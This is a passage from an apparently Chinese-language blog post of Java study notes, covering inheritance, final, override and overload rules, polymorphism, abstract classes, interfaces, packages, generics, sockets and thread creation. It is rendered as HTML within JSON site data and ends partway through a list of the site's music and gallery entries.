punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>输出结果为：</p>\n<pre><code>animal : eat\ndog : eat\nanimal : eat</code></pre><h3 id=\"final关键字\"><a href=\"#final关键字\" class=\"headerlink\" title=\"final关键字\"></a>final关键字</h3><p>final 关键字声明类可以把类定义为不能继承的，即最终类；或者用于修饰方法，该方法不能被子类重写：</p>\n<ul>\n<li><p>声明类：</p>\n<pre class=\"line-numbers language-java\"><code class=\"language-java\"><span class=\"token keyword\">final</span> <span class=\"token keyword\">class</span> 类名 <span class=\"token punctuation\">{</span><span class=\"token comment\" spellcheck=\"true\">//类体}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n<li><p>声明方法：</p>\n<pre class=\"line-numbers language-java\"><code class=\"language-java\">修饰符<span class=\"token punctuation\">(</span><span class=\"token keyword\">public</span><span class=\"token operator\">/</span><span class=\"token keyword\">private</span><span class=\"token operator\">/</span><span class=\"token keyword\">default</span><span class=\"token operator\">/</span><span class=\"token keyword\">protected</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">final</span> 返回值类型 方法名<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span><span class=\"token comment\" spellcheck=\"true\">//方法体}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n</li>\n</ul>\n<p><strong>注</strong>:实例变量也可以被定义为 final，被定义为 final 的变量不能被修改。被声明为 final 类的方法自动地声明为 final，但是实例变量并不是 final</p>\n<h3 id=\"继承的特性\"><a href=\"#继承的特性\" class=\"headerlink\" title=\"继承的特性\"></a>继承的特性</h3><ul>\n<li>子类拥有父类非 private 的属性、方法。</li>\n<li>子类可以拥有自己的属性和方法，即子类可以对父类进行扩展。</li>\n<li>子类可以用自己的方式实现父类的方法。</li>\n<li>Java 的继承是单继承，但是可以多重继承，单继承就是一个子类只能继承一个父类，多重继承就是，例如 A 类继承 B 类，B 类继承 C 类，所以按照关系就是 C 类是 B 类的父类，B 类是 A 类的父类，这是 Java 继承区别于 C++ 继承的一个特性。</li>\n<li>提高了类之间的耦合性（继承的缺点，耦合度高就会造成代码之间的联系越紧密，代码独立性越差）。</li>\n</ul>\n<h2 id=\"Java-重写-Override-与重载-Overload\"><a href=\"#Java-重写-Override-与重载-Overload\" class=\"headerlink\" title=\"Java 重写(Override)与重载(Overload)\"></a>Java 重写(Override)与重载(Overload)</h2><h3 id=\"方法的重写规则\"><a href=\"#方法的重写规则\" class=\"headerlink\" title=\"方法的重写规则\"></a>方法的重写规则</h3><ul>\n<li>参数列表与被重写方法的参数列表必须完全相同。</li>\n<li>返回类型与被重写方法的返回类型可以不相同，但是必须是父类返回值的派生类（java5 及更早版本返回类型要一样，java7 及更高版本可以不同）。</li>\n<li>访问权限不能比父类中被重写的方法的访问权限更低。例如：如果父类的一个方法被声明为 public，那么在子类中重写该方法就不能声明为 protected。</li>\n<li>父类的成员方法只能被它的子类重写。</li>\n<li>声明为 final 的方法不能被重写。</li>\n<li>声明为 static 的方法不能被重写，但是能够被再次声明。</li>\n<li>子类和父类在同一个包中，那么子类可以重写父类所有方法，除了声明为 private 和 final 的方法。</li>\n<li>子类和父类不在同一个包中，那么子类只能够重写父类的声明为 public 和 protected 的非 final 方法。</li>\n<li>重写的方法能够抛出任何非强制异常，无论被重写的方法是否抛出异常。但是，重写的方法不能抛出新的强制性异常，或者比被重写方法声明的更广泛的强制性异常，反之则可以。</li>\n<li>构造方法不能被重写。</li>\n<li>如果不能继承一个类，则不能重写该类的方法。</li>\n</ul>\n<h3 id=\"重载-Overload\"><a href=\"#重载-Overload\" class=\"headerlink\" title=\"重载(Overload)\"></a>重载(Overload)</h3><p>重载(overloading) 是在一个类里面，方法名字相同，而参数不同。返回类型可以相同也可以不同。</p>\n<p>每个重载的方法（或者构造函数）都必须有一个独一无二的参数类型列表。</p>\n<p>最常用的地方就是构造器（构造函数）的重载。</p>\n<p><strong>重载规则:</strong></p>\n<ul>\n<li>被重载的方法必须改变参数列表(参数个数或类型不一样)；</li>\n<li>被重载的方法可以改变返回类型；</li>\n<li>被重载的方法可以改变访问修饰符；</li>\n<li>被重载的方法可以声明新的或更广的检查异常；</li>\n<li>方法能够在同一个类中或者在一个子类中被重载。</li>\n<li><strong>无法以返回值类型作为重载函数的区分标准</strong>。（跟C语言类似）</li>\n</ul>\n<h2 id=\"Java-多态\"><a href=\"#Java-多态\" class=\"headerlink\" title=\"Java 多态\"></a>Java 多态</h2><h3 id=\"多态存在的三个必要条件\"><a href=\"#多态存在的三个必要条件\" class=\"headerlink\" title=\"多态存在的三个必要条件\"></a>多态存在的三个必要条件</h3><ul>\n<li>继承</li>\n<li>重写</li>\n<li><strong>父类引用指向子类对象</strong>：<strong>Parent p = new Child();</strong> （关键点！！！）</li>\n</ul>\n<h2 id=\"虚函数\"><a href=\"#虚函数\" class=\"headerlink\" title=\"虚函数\"></a>虚函数</h2><p>虚函数的存在是为了多态。</p>\n<p>Java 中其实没有虚函数的概念，它的普通函数就相当于 C++ 的虚函数，动态绑定是Java的默认行为。如果 Java 中不希望某个函数具有虚函数特性，可以加上 final 关键字变成非虚函数。</p>\n<h3 id=\"重写\"><a href=\"#重写\" class=\"headerlink\" title=\"重写\"></a>重写</h3><p>当子类对象调用重写的方法时，调用的是子类的方法，而不是父类中被重写的方法。</p>\n<p>要想调用父类中被重写的方法，则必须使用关键字 <strong>super</strong>。</p>\n<p>（这也是为什么super()函数调用父类构造方法中有this时，不会改变子类的状态，它调用的是父类的引用，改变的是父类的状态，即使这个父类根本用不到）</p>\n<h2 id=\"抽象方法\"><a href=\"#抽象方法\" class=\"headerlink\" title=\"抽象方法\"></a>抽象方法</h2><p>如果你想设计这样一个类，该类包含一个特别的成员方法，该方法的具体实现由它的子类确定，那么你可以在父类中声明该方法为抽象方法。</p>\n<p>Abstract 关键字同样可以用来声明抽象方法，抽象方法只包含一个方法名，而没有方法体。</p>\n<p>抽象方法没有定义，方法名后面直接跟一个分号，而不是花括号。</p>\n<pre class=\"line-numbers language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">abstract</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">Employee</span>\n<span class=\"token punctuation\">{</span>\n   <span class=\"token keyword\">private</span> String name<span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">private</span> String address<span class=\"token punctuation\">;</span>\n   <span class=\"token keyword\">private</span> <span class=\"token keyword\">int</span> number<span class=\"token punctuation\">;</span>\n\n   <span class=\"token keyword\">public</span> <span class=\"token keyword\">abstract</span> <span class=\"token keyword\">double</span> <span class=\"token function\">computePay</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n   <span class=\"token comment\" spellcheck=\"true\">//其余代码</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>声明抽象方法会造成以下两个结果：</p>\n<ul>\n<li>如果一个类包含抽象方法，那么该类必须是抽象类。</li>\n<li>任何子类必须重写父类的抽象方法，或者声明自身为抽象类。</li>\n</ul>\n<p>继承抽象方法的子类必须重写该方法。否则，该子类也必须声明为抽象类。最终，必须有子类实现该抽象方法，否则，从最初的父类到最终的子类都不能用来实例化对象。</p>\n<p><strong>就跟C语言差不多</strong></p>\n<h2 id=\"Java-接口\"><a href=\"#Java-接口\" class=\"headerlink\" title=\"Java 接口\"></a>Java 接口</h2><p>接口（英文：Interface），在JAVA编程语言中是一个抽象类型，是抽象方法的集合，接口通常以interface来声明。一个类通过继承接口的方式，从而来继承接口的抽象方法。</p>\n<p>接口并不是类，编写接口的方式和类很相似，但是它们属于不同的概念。类描述对象的属性和方法。接口则包含类要实现的方法。</p>\n<p>除非实现接口的类是抽象类，否则该类要定义接口中的所有方法。</p>\n<p>接口无法被实例化，但是可以被实现。一个实现接口的类，必须实现接口内所描述的所有方法，否则就必须声明为抽象类。另外，在 Java 中，接口类型可用来声明一个变量，他们可以成为一个空指针，或是被绑定在一个以此接口实现的对象。</p>\n<h3 id=\"接口与类相似点：\"><a href=\"#接口与类相似点：\" class=\"headerlink\" title=\"接口与类相似点：\"></a>接口与类相似点：</h3><ul>\n<li>一个接口可以有多个方法。</li>\n<li>接口文件保存在 .java 结尾的文件中，文件名使用接口名。</li>\n<li>接口的字节码文件保存在 .class 结尾的文件中。</li>\n<li>接口相应的字节码文件必须在与包名称相匹配的目录结构中。</li>\n</ul>\n<h3 id=\"接口与类的区别：\"><a href=\"#接口与类的区别：\" class=\"headerlink\" title=\"接口与类的区别：\"></a>接口与类的区别：</h3><ul>\n<li>接口不能用于实例化对象。</li>\n<li>接口没有构造方法。</li>\n<li>接口中所有的方法必须是抽象方法。</li>\n<li>接口不能包含成员变量，除了 static 和 final 变量。</li>\n<li>接口不是被类继承了，而是要被类实现。</li>\n<li>接口支持多继承。</li>\n</ul>\n<h3 id=\"接口特性\"><a href=\"#接口特性\" class=\"headerlink\" title=\"接口特性\"></a>接口特性</h3><ul>\n<li>接口和接口中每一个方法都是是隐式抽象的,接口中的方法会被隐式的指定为 <strong>public abstract</strong>（只能是 public abstract，其他修饰符都会报错）。</li>\n<li>接口中可以含有变量，但是接口中的变量会被隐式的指定为 <strong>public static final</strong> 变量（并且只能是 public，用 private 修饰会报编译错误）。</li>\n<li>接口中的方法是不能在接口中实现的，只能由实现接口的类来实现接口中的方法。</li>\n</ul>\n<h3 id=\"抽象类和接口的区别\"><a href=\"#抽象类和接口的区别\" class=\"headerlink\" title=\"抽象类和接口的区别\"></a>抽象类和接口的区别</h3><ul>\n<li>1.抽象类中的方法可以有方法体，就是能实现方法的具体功能，但是接口中的方法不行。</li>\n<li>2.抽象类中的成员变量可以是各种类型的，而接口中的成员变量只能是 <strong>public static final</strong> 类型的。</li>\n<li>3.接口中不能含有静态代码块以及静态方法(用 static 修饰的方法)，而抽象类是可以有静态代码块和静态方法。</li>\n<li>4.一个类只能继承一个抽象类，而一个类却可以实现多个接口。</li>\n</ul>\n<h3 id=\"标记接口\"><a href=\"#标记接口\" class=\"headerlink\" title=\"标记接口\"></a>标记接口</h3><p>最常用的继承接口是没有包含任何方法的接口。</p>\n<p><strong>标记接口是没有任何方法和属性的接口.它仅仅表明它的类属于一个特定的类型,供其他代码来测试允许做一些事情。</strong></p>\n<p>标记接口作用：简单形象的说就是给某个对象打个标（盖个戳），使对象拥有某个或某些特权。</p>\n<p>例如：java.awt.event 包中的 MouseListener 接口继承的 java.util.EventListener 接口定义如下：</p>\n<pre class=\"line-numbers language-java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">interface</span> <span class=\"token class-name\">EventListener</span>\n<span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<p>没有任何方法的接口被称为标记接口。标记接口主要用于以下两种目的：</p>\n<ul>\n<li><p>建立一个公共的父接口：</p>\n<p>正如EventListener接口，这是由几十个其他接口扩展的Java API，你可以使用一个标记接口来建立一组接口的父接口。例如：当一个接口继承了EventListener接口，Java虚拟机(JVM)就知道该接口将要被用于一个事件的代理方案。</p>\n</li>\n<li><p>向一个类添加数据类型：</p>\n<p>这种情况是标记接口最初的目的，实现标记接口的类不需要定义任何接口方法(因为标记接口根本就没有方法)，但是该类通过多态性变成一个接口类型。</p>\n</li>\n</ul>\n<p><strong>通俗说法</strong>：</p>\n<p>以Serializable接口为例。一个类实现了这个接口，说明它可以被序列化。因此，我们实际上通过Serializable这个接口，给该类标记了“可被序列化”的元数据，打上了“可被序列化”的标签。这也是标记/标签接口名字的由来。</p>\n<p>一个类实现Serializable接口，使得我们可以用 <em>instanceof</em> 对类进行类型查询<em>,</em>例如：</p>\n<p>​    <em>if(obj instanceof Serializable) {………}</em></p>\n<h2 id=\"java包\"><a href=\"#java包\" class=\"headerlink\" title=\"java包\"></a>java包</h2><p>语法：</p>\n<pre class=\"line-numbers language-java\"><code class=\"language-java\"><span class=\"token keyword\">package</span> <span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>    <span class=\"token comment\" spellcheck=\"true\">//定义一个包（表明接下来定义的这个类、接口、枚举或注释在该包中）</span>\n例：\n    <span class=\"token keyword\">package</span> net<span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">;</span>    <span class=\"token comment\" spellcheck=\"true\">//说明这个类在net.java.util这个包里</span>\n\n<span class=\"token keyword\">import</span> package1<span class=\"token punctuation\">[</span><span class=\"token punctuation\">.</span>package2…<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">(</span>classname<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    <span class=\"token comment\" spellcheck=\"true\">//引入一个包或类，使接下来可以直接使用这个包中的类</span>\n例：\n    <span class=\"token keyword\">import</span> net<span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span>*<span class=\"token punctuation\">;</span>        <span class=\"token comment\" spellcheck=\"true\">//引入net.java.util包中的所有类</span>\n    <span class=\"token keyword\">import</span> net<span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">.</span>util<span class=\"token punctuation\">.</span>Something<span class=\"token punctuation\">;</span>        <span class=\"token comment\" spellcheck=\"true\">//引入net.java.util包中的Something类</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h3 id=\"package的目录结构\"><a href=\"#package的目录结构\" class=\"headerlink\" title=\"package的目录结构\"></a>package的目录结构</h3><p>类放在包中会有两种主要的结果：</p>\n<ul>\n<li>包名成为类名的一部分，正如我们前面讨论的一样。</li>\n<li>包名必须与相应的字节码所在的目录结构相吻合。</li>\n</ul>\n<p>例如上面的 net.java.util这个包，它里面的类的java文件的路径就是：</p>\n<p>\\sources\\net\\java\\util\\ *.java</p>\n<p>class文件的的路径就是：</p>\n<p>\\classes\\net\\java\\util\\ *.class</p>\n<h2 id=\"泛型\"><a href=\"#泛型\" class=\"headerlink\" title=\"泛型\"></a>泛型</h2><h3 id=\"泛型方法（C语言中的模板）\"><a href=\"#泛型方法（C语言中的模板）\" class=\"headerlink\" title=\"泛型方法（C语言中的模板）\"></a>泛型方法（C语言中的模板）</h3><p>你可以写一个泛型方法，该方法在调用时可以接收不同类型的参数。根据传递给泛型方法的参数类型，编译器适当地处理每一个方法调用。</p>\n<p>下面是定义泛型方法的规则：</p>\n<ul>\n<li>所有泛型方法声明都有一个类型参数声明部分（由尖括号分隔），<strong>该类型参数声明部分在方法返回类型之前</strong>（在下面例子中的<e>）。</e></li>\n<li>每一个类型参数声明部分包含一个或多个类型参数，参数间用逗号隔开。一个泛型参数，也被称为一个类型变量，是用于指定一个泛型类型名称的标识符。</li>\n<li>类型参数能被用来声明返回值类型，并且能作为泛型方法得到的实际参数类型的占位符。</li>\n<li>泛型方法体的声明和其他方法一样。注意<strong>类型参数只能代表引用型类型，不能是原始类型</strong>（像int,double,char的等）。</li>\n</ul>\n<p><strong>实例：</strong></p>\n<pre class=\"line-numbers language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">GenericMethodTest</span>\n<span class=\"token punctuation\">{</span>\n   <span class=\"token comment\" spellcheck=\"true\">// 泛型方法 printArray                         </span>\n   <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token operator\">&lt;</span> E <span class=\"token operator\">></span> <span class=\"token keyword\">void</span> <span class=\"token function\">printArray</span><span class=\"token punctuation\">(</span> E<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> inputArray <span class=\"token punctuation\">)</span>\n   <span class=\"token punctuation\">{</span>\n      <span class=\"token comment\" spellcheck=\"true\">// 输出数组元素            </span>\n         <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span> E element <span class=\"token operator\">:</span> inputArray <span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>        \n            System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">printf</span><span class=\"token punctuation\">(</span> <span class=\"token string\">\"%s \"</span><span class=\"token punctuation\">,</span> element <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n         <span class=\"token punctuation\">}</span>\n         System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span> String args<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\" spellcheck=\"true\">// 创建不同类型数组： Integer, Double 和 Character</span>\n        Integer<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> intArray <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n        Double<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> doubleArray <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token number\">1.1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2.2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3.3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4.4</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n        Character<span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> charArray <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token string\">'H'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'E'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'L'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'L'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'O'</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n\n        System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span> <span class=\"token string\">\"整型数组元素为:\"</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">printArray</span><span class=\"token punctuation\">(</span> intArray  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// 传递一个整型数组</span>\n\n        System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span> <span class=\"token string\">\"\\n双精度型数组元素为:\"</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">printArray</span><span class=\"token punctuation\">(</span> doubleArray <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// 传递一个双精度型数组</span>\n\n        System<span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span> <span class=\"token string\">\"\\n字符型数组元素为:\"</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">printArray</span><span class=\"token punctuation\">(</span> charArray <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\" spellcheck=\"true\">// 传递一个字符型数组</span>\n    <span class=\"token punctuation\">}</span> \n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<h2 id=\"Java-网络编程\"><a href=\"#Java-网络编程\" class=\"headerlink\" title=\"Java 网络编程\"></a>Java 网络编程</h2><h3 id=\"Socket-编程\"><a href=\"#Socket-编程\" class=\"headerlink\" title=\"Socket 编程\"></a>Socket 编程</h3><p>套接字使用TCP提供了两台计算机之间的通信机制。 客户端程序创建一个套接字，并尝试连接服务器的套接字。</p>\n<p>当连接建立时，服务器会创建一个 Socket 对象。客户端和服务器现在可以通过对 Socket 对象的写入和读取来进行通信。</p>\n<p>java.net.Socket 类代表一个套接字，并且 java.net.ServerSocket 类为服务器程序提供了一种来监听客户端，并与他们建立连接的机制。</p>\n<p>以下步骤在两台计算机之间使用套接字建立TCP连接时会出现：</p>\n<ul>\n<li><strong>服务器实例化一个 ServerSocket 对象，表示通过服务器上的端口通信。</strong></li>\n<li><strong>服务器调用 ServerSocket 类的 accept() 方法，该方法将一直等待，直到客户端连接到服务器上给定的端口。</strong></li>\n<li><strong>服务器正在等待时，一个客户端实例化一个 Socket 对象，指定服务器名称和端口号来请求连接。</strong></li>\n<li><strong>Socket 类的构造函数试图将客户端连接到指定的服务器和端口号。如果通信被建立，则在客户端创建一个 Socket 对象能够与服务器进行通信。</strong></li>\n<li><strong>在服务器端，accept() 方法返回服务器上一个新的 socket 引用，该 socket 连接到客户端的 socket。</strong></li>\n</ul>\n<p>连接建立后，通过使用 I/O 流在进行通信，每一个socket都有一个输出流和一个输入流，客户端的输出流连接到服务器端的输入流，而客户端的输入流连接到服务器端的输出流。</p>\n<p>TCP 是一个双向的通信协议，因此数据可以通过两个数据流在同一时间发送。</p>\n<h2 id=\"Java-多线程编程\"><a href=\"#Java-多线程编程\" class=\"headerlink\" title=\"Java 多线程编程\"></a>Java 多线程编程</h2><h3 id=\"线程的优先级\"><a href=\"#线程的优先级\" class=\"headerlink\" title=\"线程的优先级\"></a>线程的优先级</h3><p>每一个 Java 线程都有一个优先级，这样有助于操作系统确定线程的调度顺序。</p>\n<p>Java 线程的优先级是一个整数，其取值范围是 1 （Thread.MIN_PRIORITY ） - 10 （Thread.MAX_PRIORITY ）。</p>\n<p>默认情况下，每一个线程都会分配一个优先级 NORM_PRIORITY（5）。</p>\n<p>具有较高优先级的线程对程序更重要，并且应该在低优先级的线程之前分配处理器资源。但是，线程优先级不能保证线程执行的顺序，而且非常依赖于平台。</p>\n<p><strong>共有以下三种方法来创建多线程</strong></p>\n<h3 id=\"通过实现-Runnable-接口来创建线程\"><a href=\"#通过实现-Runnable-接口来创建线程\" class=\"headerlink\" title=\"通过实现 Runnable 接口来创建线程\"></a>通过实现 Runnable 接口来创建线程</h3><p>创建一个线程，最简单的方法是创建一个实现 Runnable 接口的类。</p>\n<p>为了实现 Runnable，一个类只需要执行一个方法调用 run()，声明如下：</p>\n<pre class=\"line-numbers language-java\"><code class=\"language-java\"><span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>你可以重写该方法，重要的是理解的 run() 可以调用其他方法，使用其他类，并声明变量，就像主线程一样。</p>\n<p>在创建一个实现 Runnable 接口的类之后，你可以在类中实例化一个线程对象。</p>\n<p>Thread 定义了几个构造方法，下面的这个是我们经常使用的：</p>\n<pre class=\"line-numbers language-java\"><code class=\"language-java\"><span class=\"token function\">Thread</span><span class=\"token punctuation\">(</span>Runnable threadOb<span class=\"token punctuation\">,</span>String threadName<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>这里，threadOb 是一个实现 Runnable 接口的类的实例，并且 threadName 指定新线程的名字。</p>\n<p>新线程创建之后，调用它的 start() 方法它才会运行。</p>\n<pre class=\"line-numbers language-java\"><code class=\"language-java\"><span class=\"token keyword\">void</span> <span class=\"token function\">start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<h3 id=\"通过继承Thread来创建线程\"><a href=\"#通过继承Thread来创建线程\" class=\"headerlink\" title=\"通过继承Thread来创建线程\"></a>通过继承Thread来创建线程</h3><p>创建一个线程的第二种方法是创建一个新的类，该类继承 Thread 类，然后创建一个该类的实例。</p>\n<p>继承类必须重写 run() 方法，该方法是新线程的入口点。它也必须调用 start() 方法才能执行。</p>\n<p>该方法尽管被列为一种多线程实现方式，但是本质上也是实现了 Runnable 接口的一个实例。</p>\n<h3 id=\"通过-Callable-和-Future-创建线程\"><a href=\"#通过-Callable-和-Future-创建线程\" class=\"headerlink\" title=\"通过 Callable 和 Future 创建线程\"></a>通过 Callable 和 Future 创建线程</h3><ul>\n<li>1.创建 Callable 接口的实现类，并实现 call() 方法，该 call() 方法将作为线程执行体，并且有返回值。</li>\n<li>2.创建 Callable 实现类的实例，使用 FutureTask 类来包装 Callable 对象，该 FutureTask 对象封装了该 Callable 对象的 call() 方法的返回值。</li>\n<li>3.使用 FutureTask 对象作为 Thread 对象的 target 创建并启动新线程。</li>\n<li>4.调用 FutureTask 对象的 get() 方法来获得子线程执行结束后的返回值。</li>\n</ul>\n<h2 id=\"创建线程的三种方式的对比\"><a href=\"#创建线程的三种方式的对比\" class=\"headerlink\" title=\"创建线程的三种方式的对比\"></a>创建线程的三种方式的对比</h2><ul>\n<li><ol>\n<li>采用实现 Runnable、Callable 接口的方式创建多线程时，线程类只是实现了 Runnable 接口或 Callable 接口，还可以继承其他类。</li>\n</ol>\n</li>\n<li><ol start=\"2\">\n<li>使用继承 Thread 类的方式创建多线程时，编写简单，如果需要访问当前线程，则无需使用 Thread.currentThread() 方法，直接使用 this 即可获得当前线程。</li>\n</ol>\n</li>\n</ul>\n<script>\n        document.querySelectorAll('.github-emoji')\n          .forEach(el => {\n            if (!el.dataset.src) { return; }\n            const img = document.createElement('img');\n            img.style = 'display:none !important;';\n            img.src = el.dataset.src;\n            img.addEventListener('error', () => {\n              img.remove();\n              el.style.color = 'inherit';\n              el.style.backgroundImage = 'none';\n              el.style.background = 'none';\n            });\n            img.addEventListener('load', () => {\n              img.remove();\n            });\n            document.body.appendChild(img);\n          });\n      </script>","site":{"data":{"musics":[{"name":"故梦","artist":"双笙","url":"http://music.163.com/song/media/outer/url?id=409654891.mp3","cover":"http://p2.music.126.net/GZJY3Iz7TacxI3pr4jvQYQ==/18007801439911769.jpg?param=130y130"},{"name":"这个世界不会好","artist":"子默","url":"http://music.163.com/song/media/outer/url?id=571464961.mp3","cover":"http://p1.music.126.net/nzsUiw0881szTUdrgi5G1g==/109951165044907847.jpg?param=130y130"},{"name":"Beautiful World","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=20707408.mp3","cover":"https://p2.music.126.net/MEWr-THANcYy-1jvx334_Q==/109951163167214019.jpg?param=130y130"},{"name":"River Flows in You","artist":"Yiruma","url":"http://music.163.com/song/media/outer/url?id=26237342.mp3","cover":"https://p2.music.126.net/8ZRSyI0ZN_4ah8uzsNd1mA==/2324367581169008.jpg?param=130y130"},{"name":"Hello My Love","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=1338728670.mp3","cover":"https://p2.music.126.net/P2_COhPmlhsOpoj31DDLeA==/109951163785867445.jpg?param=130y130"},{"name":"If I Let You Go","artist":"Westlife","url":"http://music.163.com/song/media/outer/url?id=27220254.mp3","cover":"https://p2.music.126.net/TcOOoZSbISGT9AkhUtwOsg==/5644892697128237.jpg?param=130y130"},{"name":"Señorita","artist":"Shawn Mendes/Camila Cabello","url":"http://music.163.com/song/media/outer/url?id=1373168742.mp3","cover":"https://p2.music.126.net/eSrLKe5g3U8jX-lb629q6A==/109951164162885535.jpg?param=130y130"}],"galleries":[{"name":"背景图片3","cover":"背景图片/bg_pic_107.jpg","description":"背景图片","photos":["背景图片/bg_pic_101.jpg","背景图片/bg_pic_102.jpg","背景图片/bg_pic_103.jpg","背景图片/bg_pic_104.jpg","背景图片/bg_pic_105.jpg","背景图片/bg_pic_106.jpg","背景图片/bg_pic_107.jpg","背景图片/bg_pic_108.jpg","背景图片/bg_pic_109.jpg","背景图片/bg_pic_110.jpg","背景图片/bg_pic_111.jpg","背景图片/bg_pic_112.jpg","背景图片/bg_pic_113.jpg"]},{"name":"背景图片4","cover":"背景图片/bg_pic_130.jpg","description":"背景图片","photos":["背景图片/bg_pic_151.jpg","背景图片/bg_pic_152.jpg","背景图片/bg_pic_153.jpg","背景图片/bg_pic_154.jpg","背景图片/bg_pic_155.jpg","背景图片/bg_pic_156.jpg","背景图片/bg_pic_157.jpg","背景图片/bg_pic_158.jpg","背景图片/bg_pic_159.jpg","背景图片/bg_pic_160.jpg","背景图片/bg_pic_161.jpg","背景图片/bg_pic_162.jpg","背景图片/bg_pic_163.jpg